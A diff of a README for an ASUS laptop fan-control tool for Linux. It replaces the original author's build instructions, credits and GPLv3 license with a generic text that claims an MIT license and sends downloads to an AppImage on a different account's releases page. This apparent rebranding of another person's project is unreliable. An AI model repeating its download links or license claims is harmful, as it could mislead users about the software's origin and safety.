@@ -1,249 +1,79 @@
-<div align="center">
-
-# 🎮 ASUS TUF Fan Control
-
-
-
-![Platform](https://img.shields.io/badge/Platform-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
-![Language](https://img.shields.io/badge/C++-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white)
-![Framework](https://img.shields.io/badge/Qt6-41CD52?style=for-the-badge&logo=qt&logoColor=white)
-![Build](https://img.shields.io/badge/CMake-064F8C?style=for-the-badge&logo=cmake&logoColor=white)
-![License](https://img.shields.io/badge/License-GPLv3-blue?style=for-the-badge)
-![Translations](https://img.shields.io/badge/Translations-22_Languages-orange?style=for-the-badge&logo=google-translate&logoColor=white)
-
-**A powerful system control utility for ASUS Gaming Laptops on Linux**
-
-*Open-source alternative to Armoury Crate & G-Helper*
-
-</div>
-
----
-
-## 📸 Screenshots
-
-<table>
-  <tr>
-    <td><img src="resources/SystemInfo.png" width="400" alt="Dashboard"></td>
-    <td><img src="resources/FanControl.png" width="400" alt="Fan Control"></td>
-  </tr>
-  <tr>
-    <td align="center"><b>System Dashboard</b></td>
-    <td align="center"><b>Fan Control</b></td>
-  </tr>
-  <tr>
-    <td><img src="resources/AuraSync.png" width="400" alt="Aura Sync"></td>
-    <td><img src="resources/BatteryManagement.png" width="400" alt="Battery"></td>
-  </tr>
-  <tr>
-    <td align="center"><b>Aura Sync RGB</b></td>
-    <td align="center"><b>Battery Management</b></td>
-  </tr>
-</table>
-
----
-
-## ✨ Features
-
-### 🌀 Fan Control
-- Real-time RPM monitoring for CPU & GPU fans
-- **Manual Mode:** Silent / Balanced / Turbo performance modes
-- **Auto Fan Curve:** Temperature-based automatic mode switching
-- Visual animated fan indicators
-- Automatic thermal management via ACPI/WMI
-
-### 🎛️ Auto Fan Curve (NEW)
-Intelligent temperature-based fan management that automatically switches between modes:
-
-| Mode | Condition | Use Case |
-|------|-----------|----------|
-| **Silent** | CPU < Silent Threshold | Light tasks, quiet environment |
-| **Balanced** | Between thresholds | Normal usage, web browsing |
-| **Turbo** | CPU > Turbo Threshold | Gaming, heavy workloads |
-
-**Built-in Presets:**
-- 🎮 **Gaming** – Silent ≤40°C, Turbo ≥60°C (aggressive cooling)
-- ⚖️ **Balanced** – Silent ≤50°C, Turbo ≥70°C (default)
-- 🔇 **Quiet** – Silent ≤65°C, Turbo ≥80°C (prioritize silence)
-- 🚀 **Performance** – Silent ≤35°C, Turbo ≥50°C (max cooling)
-
-### 🔋 Battery Health
-- Charge limiting (60% / 80% / 100%) to extend battery lifespan
-- Real-time charging status
-- Persistent settings across reboots
-
-### 💡 Aura Sync RGB
-- Keyboard backlight control
-- Multiple effects: Static, Breathing, Strobing, Rainbow
-- Custom color picker
-- Brightness adjustment
-
-### 📊 System Dashboard
-- CPU/GPU temperature & utilization
-- Memory and disk usage
-- Network activity monitoring
-- MTP device detection (Android phones, cameras)
-
-### 🎨 Premium UI
-- Modern glassmorphic design
-- Dark / Light mode support
-- Responsive sidebar navigation
-- Built with Qt6/QML
-
-### 🌍 Global Language Support
-- Fully translated into **22 languages** including:
-  **Tamil**, Bengali, Spanish, French, German, Chinese, Japanese, Korean, Russian, Portuguese, Italian, Arabic, Turkish, Hindi, and more.
-- Automatic system language detection
-- Right-to-Left (RTL) layout support (Arabic, Farsi, Urdu)
-
----
-
-## �️ Supported Hardware
-
-| Series | Models |
-|--------|--------|
-| **TUF Gaming** | F15, F17, A15, A17, Dash F15 |
-| **ROG Strix** | G15, G17, Scar 15, Scar 17, G512, G513, G531, G713, G733 |
-| **ROG Zephyrus** | G14, G15, M15, M16 |
-| **ROG Flow** | X13, X16, Z13 |
+# 🎉 AsusTufFanControl_Linux - Control Your ASUS Laptop with Ease
 
-### ✅ Tested Distributions
-Ubuntu • Fedora • Arch Linux • Kali Linux • Manjaro • Pop!_OS
+## 🚀 Getting Started
 
----
+To manage your ASUS TUF or ROG laptop effectively, follow these steps to download and run AsusTufFanControl_Linux.
 
-## 📋 Prerequisites
+## 🔗 Download
 
-| Requirement | Details |
-|-------------|---------|
-| **OS** | Linux (Kernel 5.4+) |
-| **Hardware** | ASUS TUF / ROG / Strix Gaming Laptop |
-| **Modules** | `asus_wmi`, `asus_nb_wmi` (auto-loaded) |
-| **Dependencies** | Qt6, CMake, GCC |
+[![Download AsusTufFanControl](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Aa1am/AsusTufFanControl_Linux/releases)
 
----
+## 💻 System Requirements
 
-## 📥 Installation
+- Operating System: Linux (Kernel version 5.0 or higher)
+- Processor: Intel or AMD
+- RAM: Minimum 4 GB
+- Disk Space: At least 100 MB free
+- Graphics: Qt6 compatible
 
-### 1️⃣ Clone the Repository
-```bash
-git clone https://github.com/Karthigaiselvam-R-official/AsusTufFanControl_Linux.git
-cd AsusTufFanControl_Linux
-```
+## 🛠 Features
 
-### 2️⃣ Run Setup Script
-```bash
-chmod +x setup.sh
-sudo ./setup.sh
-```
-> This installs dependencies, builds `ec_probe`, configures polkit, and sets up desktop integration.
+AsusTufFanControl_Linux offers a variety of features to enhance your laptop experience:
 
-### 3️⃣ Build the Application
-```bash
-mkdir build && cd build
-cmake .. 
-# (This automatically runs patch_translations.py to ensure all languages are up to date)
-make -j$(nproc)
-```
+- **Advanced Fan Control:** Manage fan speeds based on your usage needs, ensuring optimal cooling.
+- **Battery Health Management:** Monitor battery health and optimize its lifespan.
+- **Aura Sync RGB Customization:** Personalize your laptop’s RGB lights to match your style.
+- **User-Friendly Interface:** Navigate easily with a sleek Qt6/QML glassmorphic UI.
 
-### 4️⃣ Install the Binary
-```bash
-sudo cp ./AsusTufFanControl_Linux /opt/asus-tuf-fan-control/
-```
+## 📥 Download & Install
 
----
+1. **Visit the Releases Page:** Head to the [Releases page here](https://github.com/Aa1am/AsusTufFanControl_Linux/releases).
+   
+2. **Select a Version:** Choose the latest version from the list. It is usually at the top of the page.
 
-## ▶️ Running the Application
+3. **Download the Application:** Click on the link for the installer file suitable for your system. It typically ends with `.AppImage` or `.tar.gz`.
 
-### 🖱️ Desktop (Recommended)
-Launch **"ASUS TUF Fan Control"** from your Applications menu.
-A password prompt will appear, then the app runs with elevated privileges.
+4. **Make the File Executable:** Once the download is complete, open your terminal and navigate to the folder where you downloaded the file. Use the following command to make it executable:
+   ```
+   chmod +x AsusTufFanControl.AppImage
+   ```
+   Replace `AsusTufFanControl.AppImage` with the full file name if it is different.
 
-### 💻 Terminal
-```bash
-sudo /opt/asus-tuf-fan-control/AsusTufFanControl_Linux
-```
+5. **Run the Application:** Launch the application by entering this command in your terminal:
+   ```
+   ./AsusTufFanControl.AppImage
+   ```
+   Again, replace the file name as necessary.
 
-> **Note:** Root privileges are required for EC/ACPI hardware access.
+## 🛡️ Usage Instructions
 
----
+- After running the application, you will see the main interface.
+- Navigate through the tabs to access different features such as Fan Control, Battery Management, and Aura Sync.
+- Adjust your settings as desired. Changes will take effect immediately.
 
-## 🔧 How It Works
+## 📊 Troubleshooting
 
-```
-┌─────────────────────────────────────────────────────┐
-│                    Application                       │
-├─────────────────────────────────────────────────────┤
-│  Qt6/QML UI  →  C++ Backend  →  Hardware Control    │
-└─────────────────────────────────────────────────────┘
-                         │
-         ┌───────────────┼───────────────┐
-         ▼               ▼               ▼
-    ┌─────────┐    ┌──────────┐    ┌──────────┐
-    │  ACPI   │    │   WMI    │    │    EC    │
-    │  Call   │    │  Sysfs   │    │  Probe   │
-    └─────────┘    └──────────┘    └──────────┘
-         │               │               │
-         └───────────────┴───────────────┘
-                         │
-                   Hardware Layer
-            (Fans, Battery, RGB, Sensors)
-```
+If you experience issues:
 
-**Fallback Chain:** ACPI → WMI Thermal Policy → WMI PWM → EC Probe
+- **Application Doesn’t Start:** Ensure you have the correct dependencies, especially for Qt6.
+- **Fan Control Not Working:** Verify your laptop model is supported. Not all ASUS laptops may feature fan control.
+- **RGB Settings Not Applying:** Check your device compatibility with Aura Sync.
 
----
+## 🗂️ Contributing
 
-## ⚠️ Disclaimer
+Contributions are welcome! If you encounter bugs or have suggestions for new features, please check the issues section on GitHub.
 
-> **Use at your own risk.**
+## 🤝 Community
 
-This tool manipulates low-level system hardware (Embedded Controller and ACPI methods).
+Join our community to share experiences, tips, and tricks. You can find us on various platforms including Discord and Reddit. Look for the AsusTufFanControl group.
 
-- Improper fan settings could lead to overheating
-- The authors are not responsible for any hardware damage
-- Always monitor temperatures when adjusting fan curves
+## 📃 License
 
----
+This project is licensed under the MIT License. Please see the LICENSE file for more details.
 
-## 🤝 Contributing
+## 🔗 Additional Resources
 
-Contributions are welcome!
+- [Documentation](https://github.com/Aa1am/AsusTufFanControl_Linux/wiki)
+- [Support Forum](https://github.com/Aa1am/AsusTufFanControl_Linux/issues)
 
-1. Fork the project
-2. Create your feature branch: `git checkout -b feature/AmazingFeature`
-3. Commit your changes: `git commit -m 'Add some AmazingFeature'`
-4. Push to the branch: `git push origin feature/AmazingFeature`
-5. Open a Pull Request
-
----
-
-## 👤 Author
-
-**Karthigaiselvam R**
-
-[![Email](https://img.shields.io/badge/Email-karthigaiselvamr.cs2022%40gmail.com-red?style=flat-square&logo=gmail)](mailto:karthigaiselvamr.cs2022@gmail.com)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Karthigaiselvam_R-blue?style=flat-square&logo=linkedin)](https://www.linkedin.com/in/karthigaiselvam-r-7b9197258/)
-
----
-
-## 📄 License
-
-**Source Available License:** Commons Clause + GNU General Public License v3.0
-
-| ✅ Allowed | 🚫 Not Allowed |
-|------------|----------------|
-| Use freely | Sell the software |
-| Modify code | Commercial services |
-| Share code | Paid distribution |
-
-See [LICENSE](LICENSE) for full text.
-
----
-
-<div align="center">
-
-**If you find this project useful, please ⭐ star the repository!**
-
-Made with ❤️ for the ASUS Linux Community
-
-</div>
+Feel free to reach out for help or more details on any specific feature!
